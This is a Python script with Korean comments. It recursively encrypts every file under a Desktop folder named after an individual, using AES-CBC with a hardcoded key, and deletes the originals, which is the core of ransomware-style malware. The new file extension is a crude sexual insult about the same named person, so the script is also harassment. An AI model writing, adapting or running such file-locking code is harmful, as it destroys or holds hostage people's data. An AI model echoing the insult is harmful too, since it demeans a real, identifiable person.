import glob

import os, random, struct

from Crypto.Cipher import AES


def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename + '.진형준보지지름15cm'  # out_filename 인자를 지정안할 경우 기존 파일명을 사용하여 ㅇㅇ 라는 확장명 추가

    iv = os.urandom(16)  # 랜덤한 16자리의 Byte값을 생성

    encryptor = AES.new(key, AES.MODE_CBC, iv)  # cryptodomex 모듈의 AES를 이용해서 암호화 키를 생성

    filesize = os.path.getsize(in_filename)  # 현재 파일의 파일크기 추출

    with open(in_filename, 'rb') as infile:  # 현재파일을 바이너리 모드로 읽음

        with open(out_filename, 'wb') as outfile:  # 바이너리 모드로 새로운 파일을 생성

            outfile.write(struct.pack('<Q', filesize))  # 파일크기를 바이너리로 int형으로 패킹하여 새 파일에 작성

            outfile.write(iv)  # 새 파일에 랜덤한 16자리의 Byte를 작성

            while True:

                chunk = infile.read(chunksize)  # 현재파일의 (64 * 1024 = 65536) 만큼을 읽어들여 쓰레기값 이라고 선언

                if len(chunk) == 0:  # 현재파일 쓰레기 값의 길이가 0일때 루프 탈출

                    break

                elif len(chunk) % 16 != 0:  # 현재 파일의 쓰레기 값이 16으로 나눴을때 나머지가 0이 아닐 경우

                    chunk += b' ' * (16 - len(chunk) % 16)  # 쓰레기값 += 빈 바이너리 (16 - 현재쓰레기길이 % 16)

                outfile.write(encryptor.encrypt(chunk))  # AES로 암호화 한 쓰레기를 새 파일에 작성하고 종료


key = b'asdfghjkl1234567'  # AES 암호화에사용될 키값을 바이너리로 생성

startPath = 'C:/Users/user/Desktop/진형준/**'  # 암 / 복호화할 대상 경로

# Encrypts all files recursively starting from startPath

for filename in glob.iglob(startPath, recursive=True):  # 대상 경로를 재귀적 호출 사용

    if (os.path.isfile(filename)):  # 현재 파일이 파일일때

        print('Encrypting> ' + filename)  # 파일명 출력

        encrypt_file(key, filename)  # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출

        os.remove(filename)  # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
